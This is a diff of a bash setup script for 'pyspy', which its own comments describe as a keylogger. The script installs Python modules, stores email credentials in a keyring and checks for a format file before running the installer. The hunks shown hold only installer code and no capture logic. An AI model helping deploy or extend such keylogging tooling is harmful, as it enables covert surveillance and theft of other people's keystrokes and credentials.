@@ -2,7 +2,9 @@
 
 # the purpose of this script is to do the setup and begin running the keylogger for you
 # this script will take your pyspy server email and password. It will then add the 
-# pair to the keyring for authentication use.
+# pair to the keyring for authentication use. Make sure to give the script
+# executable rights and to have the path variable setup correctly in you .bash_profile.
+# If you don't then you could run into some issues with running the script
 
 # Brady Murphy
 # June 17, 2019
@@ -10,6 +12,14 @@
 # install the python modules if needed
 pip3 install keyring
 pip3 install yagmail
+
+# check to see if the format file exists
+FILE=./src/format.txt
+if ! [ -f "$FILE" ]; then
+	echo "format.txt file not found in src folder"
+	echo "please add the file and initalize it as described in the readme.md"
+	exit 1;
+fi
 
 # run the email setup script, then installer
 python3 src/setup.py
